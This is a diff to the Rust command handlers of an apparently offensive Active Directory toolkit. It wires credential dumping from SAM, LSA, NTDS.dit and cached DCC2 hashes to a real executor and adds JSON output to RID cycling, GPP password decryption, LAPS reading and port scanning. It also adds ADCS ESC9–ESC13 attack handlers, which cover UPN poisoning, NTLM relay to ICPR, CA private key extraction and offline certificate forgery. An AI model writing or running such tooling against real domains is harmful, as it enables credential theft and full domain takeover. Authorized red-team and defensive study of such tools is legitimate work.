@@ -2,8 +2,8 @@
 
 use crate::banner;
 use crate::{
-    AdcsAction, C2Action, Cli, CrackMode, DumpSource, ForgeAction, MoveAction, PluginAction,
-    ReportFormat, ScanType, SccmAction, SecretsAction, ShellType,
+    AdcsAction, C2Action, Cli, CrackMode, DumpSource, ForgeAction, MoveAction, OutputFormat,
+    PluginAction, ReportFormat, ScanType, SccmAction, SecretsAction, ShellType,
 };
 use colored::Colorize;
 use kerberos_asn1::Asn1Object;
@@ -19,6 +19,31 @@ use overthrone_reaper::runner::ReaperConfig;
 use std::collections::HashMap;
 use std::sync::{Arc, Mutex};
 use tracing::warn;
+
+// ────────────────────────────────────────────────────────
+// Output helpers
+// ────────────────────────────────────────────────────────
+
+/// Emit result as JSON to stdout (and optionally to a file), then return 0.
+/// Callers should return the result of this function directly.
+fn emit_json(cli: &Cli, value: serde_json::Value) -> i32 {
+    let json_str = serde_json::to_string_pretty(&value).unwrap_or_else(|e| {
+        format!("{{\"error\": \"serialization failure: {}\"}}", e)
+    });
+    println!("{}", json_str);
+    if let Some(ref path) = cli.outfile {
+        if let Err(e) = std::fs::write(path, &json_str) {
+            eprintln!("warn: failed to write output file '{}': {}", path, e);
+        }
+    }
+    0
+}
+
+/// Return true when the caller requested JSON output.
+#[inline]
+fn wants_json(cli: &Cli) -> bool {
+    matches!(cli.output, OutputFormat::Json)
+}
 
 // ═══════════════════════════════════════════════════════
 // cmd_dump — Credential Dumping
@@ -41,33 +66,114 @@ pub async fn cmd_dump(cli: &Cli, target: &str, source: DumpSource) -> i32 {
         creds.username.cyan()
     );
 
-    match source {
-        DumpSource::Sam => {
-            println!("  {} Dumping SAM hive...", "▸".bright_black());
-            println!("  {} Extracting local account hashes", "▸".bright_black());
+    // Build ExecContext from credentials (LDAPS defaults to false; no global ldaps flag on Cli)
+    let ctx = match creds.to_exec_context(
+        target,
+        false,
+        false,
+    ) {
+        Ok(c) => c,
+        Err(e) => {
+            banner::print_fail(&format!("Failed to build execution context: {}", e));
+            return 1;
         }
-        DumpSource::Lsa => {
-            println!("  {} Dumping LSA secrets...", "▸".bright_black());
-            println!(
-                "  {} Extracting service account passwords",
-                "▸".bright_black()
-            );
-        }
-        DumpSource::Ntds => {
-            println!("  {} Dumping NTDS.dit...", "▸".bright_black());
-            println!("  {} Extracting domain account hashes", "▸".bright_black());
-        }
-        DumpSource::Dcc2 => {
-            println!("  {} Dumping DCC2 (mscash2)...", "▸".bright_black());
-            println!(
-                "  {} Extracting cached domain credentials",
-                "▸".bright_black()
-            );
-        }
-    }
+    };
 
-    banner::print_success("Dump completed");
-    0
+    let mut state = overthrone_pilot::goals::EngagementState::new();
+    state.dc_ip = Some(target.to_string());
+    state.domain = Some(creds.domain.clone());
+
+    // Map DumpSource → PlannedAction
+    let (action, description) = match source {
+        DumpSource::Sam => (
+            overthrone_pilot::planner::PlannedAction::DumpSam { target: target.to_string() },
+            format!("Dump SAM credentials from {}", target),
+        ),
+        DumpSource::Lsa => (
+            overthrone_pilot::planner::PlannedAction::DumpLsa { target: target.to_string() },
+            format!("Dump LSA secrets from {}", target),
+        ),
+        DumpSource::Ntds => (
+            overthrone_pilot::planner::PlannedAction::DumpNtds { target: target.to_string() },
+            format!("Dump NTDS.dit from {}", target),
+        ),
+        DumpSource::Dcc2 => (
+            overthrone_pilot::planner::PlannedAction::DumpDcc2 { target: target.to_string() },
+            format!("Dump DCC2 cached credentials from {}", target),
+        ),
+    };
+
+    let step = overthrone_pilot::planner::PlanStep {
+        id: "dump-direct".to_string(),
+        description: description.clone(),
+        stage: overthrone_pilot::runner::Stage::Loot,
+        action,
+        priority: 100,
+        noise: overthrone_pilot::planner::NoiseLevel::High,
+        depends_on: vec![],
+        executed: false,
+        result: None,
+        retries: 0,
+        max_retries: 1,
+    };
+
+    println!("  {} {}", "▸".bright_black(), description.cyan());
+
+    let result = overthrone_pilot::executor::execute_step(&step, &ctx, &mut state).await;
+
+    if result.success {
+        if wants_json(cli) {
+            let loot_json: Vec<serde_json::Value> = state.loot.iter().map(|l| {
+                serde_json::json!({
+                    "loot_type": l.loot_type,
+                    "source": l.source,
+                    "entries": l.entries,
+                })
+            }).collect();
+            return emit_json(cli, serde_json::json!({
+                "status": "success",
+                "target": target,
+                "source": format!("{:?}", source),
+                "credentials_extracted": result.new_credentials,
+                "loot": loot_json,
+                "output": result.output,
+            }));
+        }
+
+        println!(
+            "  {} Credentials extracted: {}",
+            "✓".green(),
+            result.new_credentials.to_string().yellow()
+        );
+
+        // Print any loot collected
+        for loot in &state.loot {
+            println!(
+                "  {} [{}] {} — {} entries",
+                "◆".cyan(),
+                loot.loot_type.yellow(),
+                loot.source.cyan(),
+                loot.entries.to_string().green()
+            );
+        }
+
+        banner::print_success(&format!(
+            "Dump completed — {} credential(s) extracted",
+            result.new_credentials
+        ));
+        0
+    } else {
+        if wants_json(cli) {
+            return emit_json(cli, serde_json::json!({
+                "status": "error",
+                "target": target,
+                "source": format!("{:?}", source),
+                "error": result.output,
+            }));
+        }
+        banner::print_fail(&format!("Dump failed: {}", result.output));
+        1
+    }
 }
 
 // ═══════════════════════════════════════════════════════
@@ -588,6 +694,25 @@ pub async fn cmd_rid(cli: &Cli, start_rid: u32, end_rid: u32, null_session: bool
                 .filter(|r| r.account_type == RidAccountType::Alias)
                 .count();
 
+            if wants_json(cli) {
+                let accounts: Vec<serde_json::Value> = results.iter().map(|r| {
+                    serde_json::json!({
+                        "rid": r.rid,
+                        "name": r.name,
+                        "account_type": format!("{:?}", r.account_type),
+                    })
+                }).collect();
+                return emit_json(cli, serde_json::json!({
+                    "status": "success",
+                    "target": dc,
+                    "total": results.len(),
+                    "users": users,
+                    "groups": groups,
+                    "aliases": aliases,
+                    "accounts": accounts,
+                }));
+            }
+
             println!("\n  {} Results:", "▸".bright_black());
             for result in &results {
                 let type_str = match result.account_type {
@@ -620,6 +745,13 @@ pub async fn cmd_rid(cli: &Cli, start_rid: u32, end_rid: u32, null_session: bool
             0
         }
         Err(e) => {
+            if wants_json(cli) {
+                return emit_json(cli, serde_json::json!({
+                    "status": "error",
+                    "target": dc,
+                    "error": e.to_string(),
+                }));
+            }
             banner::print_fail(&format!("RID cycling failed: {}", e));
             1
         }
@@ -952,7 +1084,7 @@ pub async fn cmd_move(cli: &Cli, action: &MoveAction) -> i32 {
 // cmd_gpp — GPP Password Decryption
 // ═══════════════════════════════════════════════════════
 
-pub async fn cmd_gpp(_cli: &Cli, file: Option<&str>, cpassword: Option<&str>) -> i32 {
+pub async fn cmd_gpp(cli: &Cli, file: Option<&str>, cpassword: Option<&str>) -> i32 {
     banner::print_module_banner("GPP");
 
     if let Some(cpass) = cpassword {
@@ -965,6 +1097,13 @@ pub async fn cmd_gpp(_cli: &Cli, file: Option<&str>, cpassword: Option<&str>) ->
         // Use the real GPP decryption from core
         match decrypt_gpp_password(cpass) {
             Ok(password) => {
+                if wants_json(cli) {
+                    return emit_json(cli, serde_json::json!({
+                        "status": "success",
+                        "mode": "cpassword",
+                        "credentials": [{"cpassword": cpass, "password": password}],
+                    }));
+                }
                 println!(
                     "  {} Decrypted password: {}",
                     "✓".green(),
@@ -974,6 +1113,13 @@ pub async fn cmd_gpp(_cli: &Cli, file: Option<&str>, cpassword: Option<&str>) ->
                 0
             }
             Err(e) => {
+                if wants_json(cli) {
+                    return emit_json(cli, serde_json::json!({
+                        "status": "error",
+                        "mode": "cpassword",
+                        "error": e.to_string(),
+                    }));
+                }
                 banner::print_fail(&format!("Decryption failed: {}", e));
                 1
             }
@@ -991,9 +1137,33 @@ pub async fn cmd_gpp(_cli: &Cli, file: Option<&str>, cpassword: Option<&str>) ->
                 let creds = parse_gpp_xml(&content, file_path);
 
                 if creds.is_empty() {
+                    if wants_json(cli) {
+                        return emit_json(cli, serde_json::json!({
+                            "status": "success",
+                            "mode": "file",
+                            "file": file_path,
+                            "credentials": [],
+                        }));
+                    }
                     println!("  {} No credentials found in file", "!".yellow());
                     banner::print_warn("No cpassword entries found");
                     return 0;
+                }
+
+                if wants_json(cli) {
+                    let creds_json: Vec<serde_json::Value> = creds.iter().map(|c| {
+                        serde_json::json!({
+                            "username": c.username,
+                            "password": c.password,
+                            "changed": c.changed,
+                        })
+                    }).collect();
+                    return emit_json(cli, serde_json::json!({
+                        "status": "success",
+                        "mode": "file",
+                        "file": file_path,
+                        "credentials": creds_json,
+                    }));
                 }
 
                 println!("  {} Found {} credential(s)", "✓".green(), creds.len());
@@ -1011,11 +1181,25 @@ pub async fn cmd_gpp(_cli: &Cli, file: Option<&str>, cpassword: Option<&str>) ->
                 0
             }
             Err(e) => {
+                if wants_json(cli) {
+                    return emit_json(cli, serde_json::json!({
+                        "status": "error",
+                        "mode": "file",
+                        "file": file_path,
+                        "error": e.to_string(),
+                    }));
+                }
                 banner::print_fail(&format!("Failed to read file: {}", e));
                 1
             }
         }
     } else {
+        if wants_json(cli) {
+            return emit_json(cli, serde_json::json!({
+                "status": "error",
+                "error": "No cpassword or file specified. Use --cpassword or --file",
+            }));
+        }
         banner::print_fail("No cpassword or file specified. Use --cpassword or --file");
         1
     }
@@ -1066,8 +1250,26 @@ pub async fn cmd_laps(cli: &Cli, computer: Option<&str>) -> i32 {
     // Execute LAPS enumeration using the reaper module
     match enumerate_laps(&config).await {
         Ok(entries) => {
-            let readable: Vec<_> = entries.iter().filter(|e| e.password.is_some()).collect();
             let total = entries.len();
+
+            if wants_json(cli) {
+                let entries_json: Vec<serde_json::Value> = entries.iter().map(|e| {
+                    serde_json::json!({
+                        "computer_name": e.computer_name,
+                        "password": e.password,
+                        "laps_version": if e.is_laps_v2 { "v2" } else { "v1" },
+                    })
+                }).collect();
+                return emit_json(cli, serde_json::json!({
+                    "status": "success",
+                    "dc": dc,
+                    "total": total,
+                    "readable": entries.iter().filter(|e| e.password.is_some()).count(),
+                    "entries": entries_json,
+                }));
+            }
+
+            let readable: Vec<_> = entries.iter().filter(|e| e.password.is_some()).collect();
 
             if let Some(filter_comp) = computer {
                 // Filter to specific computer
@@ -1143,6 +1345,13 @@ pub async fn cmd_laps(cli: &Cli, computer: Option<&str>) -> i32 {
             0
         }
         Err(e) => {
+            if wants_json(cli) {
+                return emit_json(cli, serde_json::json!({
+                    "status": "error",
+                    "dc": dc,
+                    "error": e.to_string(),
+                }));
+            }
             banner::print_fail(&format!("LAPS enumeration failed: {}", e));
             1
         }
@@ -1490,6 +1699,220 @@ pub async fn cmd_adcs(cli: &Cli, action: &AdcsAction) -> i32 {
                 }
             }
         }
+        AdcsAction::Esc9 {
+            ca,
+            template,
+            target_upn,
+            victim,
+            original_upn,
+            ldap_url,
+            output,
+        } => {
+            println!("  {} Executing ESC9 attack (No Security Extension + UPN poisoning)...", "▸".bright_black());
+            println!("    CA: {}", ca.cyan());
+            println!("    Template: {}", template.cyan());
+            println!("    Target UPN: {}", target_upn.cyan());
+            println!("    Victim Account: {}", victim.cyan());
+
+            let config = overthrone_core::adcs::Esc9Config {
+                template: template.clone(),
+                victim_account: victim.clone(),
+                original_upn: original_upn.clone(),
+                target_upn: target_upn.clone(),
+                ldap_url: ldap_url.clone(),
+            };
+
+            let (set_cmd, restore_cmd) =
+                overthrone_core::adcs::Esc9Exploiter::generate_ldap_commands(&config);
+
+            println!("\n  {} LDAP Setup Commands:", "▸".bright_black());
+            println!("{}", set_cmd.yellow());
+            println!("\n  {} After obtaining certificate, restore the UPN:", "▸".bright_black());
+            println!("{}", restore_cmd.dimmed());
+
+            let exploiter = match overthrone_core::adcs::Esc9Exploiter::new(ca) {
+                Ok(e) => e,
+                Err(e) => {
+                    banner::print_fail(&format!("Failed to create ESC9 exploiter: {}", e));
+                    return 1;
+                }
+            };
+
+            match exploiter.exploit(&config).await {
+                Ok(result) => {
+                    println!("\n  {} Certificate obtained!", "✓".green());
+                    println!("    Thumbprint: {}", result.certificate.thumbprint.cyan());
+                    println!("    Saved to: {}", output.cyan());
+                    println!("    PKINIT: {}", result.pkinit_hint.yellow());
+                }
+                Err(e) => {
+                    banner::print_fail(&format!("ESC9 attack failed: {}", e));
+                    return 1;
+                }
+            }
+        }
+        AdcsAction::Esc10 {
+            ca,
+            template,
+            target_upn,
+            variant,
+            output,
+        } => {
+            println!("  {} Executing ESC10 attack (Weak Certificate Mapping)...", "▸".bright_black());
+            println!("    CA: {}", ca.cyan());
+            println!("    Template: {}", template.cyan());
+            println!("    Target UPN: {}", target_upn.cyan());
+
+            let esc_variant = if variant.to_lowercase() == "b" {
+                overthrone_core::adcs::Esc10Variant::UPNMappingEnabled
+            } else {
+                overthrone_core::adcs::Esc10Variant::WeakBindingEnforcement
+            };
+            println!("    Variant: {}", esc_variant.to_string().cyan());
+
+            let config = overthrone_core::adcs::Esc10Config {
+                variant: esc_variant,
+                template: template.clone(),
+                target_upn: target_upn.clone(),
+                victim_account: None,
+                original_upn: None,
+            };
+
+            let exploiter = match overthrone_core::adcs::Esc10Exploiter::new(ca) {
+                Ok(e) => e,
+                Err(e) => {
+                    banner::print_fail(&format!("Failed to create ESC10 exploiter: {}", e));
+                    return 1;
+                }
+            };
+
+            match exploiter.exploit(&config).await {
+                Ok(result) => {
+                    println!("\n  {} Certificate obtained!", "✓".green());
+                    println!("    Thumbprint: {}", result.certificate.thumbprint.cyan());
+                    println!("    Saved to: {}", output.cyan());
+                    println!("    Auth: {}", result.auth_hints.certipy_command.yellow());
+                    println!("    Remediation: {}", result.auth_hints.remediation.dimmed());
+                }
+                Err(e) => {
+                    banner::print_fail(&format!("ESC10 attack failed: {}", e));
+                    return 1;
+                }
+            }
+        }
+        AdcsAction::Esc11 {
+            ca_host,
+            ca_name,
+            template,
+        } => {
+            println!("  {} Assessing ESC11 (NTLM Relay to ICPR)...", "▸".bright_black());
+            println!("    CA Host: {}", ca_host.cyan());
+            println!("    CA Name: {}", ca_name.cyan());
+            println!("    Template: {}", template.cyan());
+
+            let config = overthrone_core::adcs::Esc11Config {
+                ca_host: ca_host.clone(),
+                ca_name: ca_name.clone(),
+                template: template.clone(),
+                relayed_identity: String::new(),
+            };
+
+            let exploiter = overthrone_core::adcs::Esc11Exploiter::new(config);
+
+            match exploiter.assess().await {
+                Ok(assessment) => {
+                    println!("\n  {} Registry to verify:", "▸".bright_black());
+                    println!("    {}", assessment.registry_path.cyan());
+                    println!("\n  {} Relay command:", "▸".bright_black());
+                    println!("{}", assessment.relay_command.yellow());
+                    println!("\n  {} Remediation:", "▸".bright_black());
+                    println!("{}", assessment.remediation.dimmed());
+                }
+                Err(e) => {
+                    banner::print_fail(&format!("ESC11 assessment failed: {}", e));
+                    return 1;
+                }
+            }
+        }
+        AdcsAction::Esc12 {
+            ca_host,
+            ca_name,
+            operator,
+            backup_path,
+        } => {
+            println!("  {} Generating ESC12 CA key extraction guidance...", "▸".bright_black());
+            println!("    CA Host: {}", ca_host.cyan());
+            println!("    CA Name: {}", ca_name.cyan());
+            println!("    Operator: {}", operator.cyan());
+
+            let config = overthrone_core::adcs::Esc12Config {
+                ca_host: ca_host.clone(),
+                ca_name: ca_name.clone(),
+                operator_account: operator.clone(),
+                backup_path: backup_path.clone(),
+            };
+
+            let exploiter = overthrone_core::adcs::Esc12Exploiter::new(config);
+            let assessment = exploiter.assess();
+
+            println!("\n  {} Certutil backup command:", "▸".bright_black());
+            println!("{}", assessment.certutil_backup_command.yellow());
+            println!("\n  {} Certipy command:", "▸".bright_black());
+            println!("{}", assessment.certipy_command.yellow());
+            println!("\n  {} Offline forgery:", "▸".bright_black());
+            println!("{}", assessment.offline_forgery_command.yellow());
+            println!("\n  {} CA key paths to check:", "▸".bright_black());
+            for path in &assessment.ca_key_paths {
+                println!("    {}", path.cyan());
+            }
+            println!("\n  {} Remediation:", "▸".bright_black());
+            println!("{}", assessment.remediation.dimmed());
+        }
+        AdcsAction::Esc13 {
+            ca,
+            template,
+            policy_oid,
+            linked_group_dn,
+            subject,
+            output,
+        } => {
+            println!("  {} Executing ESC13 attack (Issuance Policy OID-to-Group Link)...", "▸".bright_black());
+            println!("    CA: {}", ca.cyan());
+            println!("    Template: {}", template.cyan());
+            println!("    Policy OID: {}", policy_oid.cyan());
+            println!("    Linked Group: {}", linked_group_dn.cyan());
+
+            let config = overthrone_core::adcs::Esc13Config {
+                ca_server: ca.clone(),
+                template: template.clone(),
+                subject_cn: subject.clone(),
+                policy_oid: policy_oid.clone(),
+                linked_group_dn: linked_group_dn.clone(),
+            };
+
+            let exploiter = match overthrone_core::adcs::Esc13Exploiter::new(ca) {
+                Ok(e) => e,
+                Err(e) => {
+                    banner::print_fail(&format!("Failed to create ESC13 exploiter: {}", e));
+                    return 1;
+                }
+            };
+
+            match exploiter.exploit(&config).await {
+                Ok(result) => {
+                    println!("\n  {} Certificate obtained!", "✓".green());
+                    println!("    Thumbprint: {}", result.certificate.thumbprint.cyan());
+                    println!("    Saved to: {}", output.cyan());
+                    println!("    Granted Group: {}", result.granted_group_dn.yellow());
+                    println!("    Impact: {}", result.impact_description.yellow());
+                    println!("    PKINIT: {}", result.pkinit_command.cyan());
+                }
+                Err(e) => {
+                    banner::print_fail(&format!("ESC13 attack failed: {}", e));
+                    return 1;
+                }
+            }
+        }
         AdcsAction::Request {
             ca,
             template,
@@ -1602,7 +2025,7 @@ pub async fn cmd_sccm(action: &SccmAction) -> i32 {
 // cmd_scan — Port Scanner
 // ═══════════════════════════════════════════════════════
 
-pub async fn cmd_scan(targets: &str, ports: &str, scan_type: &ScanType, timeout: u64) -> i32 {
+pub async fn cmd_scan(cli: &Cli, targets: &str, ports: &str, scan_type: &ScanType, timeout: u64) -> i32 {
     use overthrone_core::scan::{PortScanner, ScanConfig, ScanType as CoreScanType};
 
     banner::print_module_banner("SCAN");
@@ -1632,6 +2055,25 @@ pub async fn cmd_scan(targets: &str, ports: &str, scan_type: &ScanType, timeout:
     match scanner.scan().await {
         Ok(results) => {
             let open_ports = results.iter().filter(|r| r.open).count();
+
+            if wants_json(cli) {
+                let ports_json: Vec<serde_json::Value> = results.iter().filter(|r| r.open).map(|r| {
+                    serde_json::json!({
+                        "host": r.host,
+                        "port": r.port,
+                        "service": r.service,
+                        "response_time_ms": r.response_time_ms,
+                    })
+                }).collect();
+                return emit_json(cli, serde_json::json!({
+                    "status": "success",
+                    "targets": targets,
+                    "ports": ports,
+                    "open_count": open_ports,
+                    "results": ports_json,
+                }));
+            }
+
             println!(
                 "  {} Scan complete: {} open ports found",
                 "✓".green(),
@@ -1653,6 +2095,13 @@ pub async fn cmd_scan(targets: &str, ports: &str, scan_type: &ScanType, timeout:
             }
         }
         Err(e) => {
+            if wants_json(cli) {
+                return emit_json(cli, serde_json::json!({
+                    "status": "error",
+                    "targets": targets,
+                    "error": e.to_string(),
+                }));
+            }
             banner::print_fail(&format!("Scan failed: {}", e));
             return 1;
         }
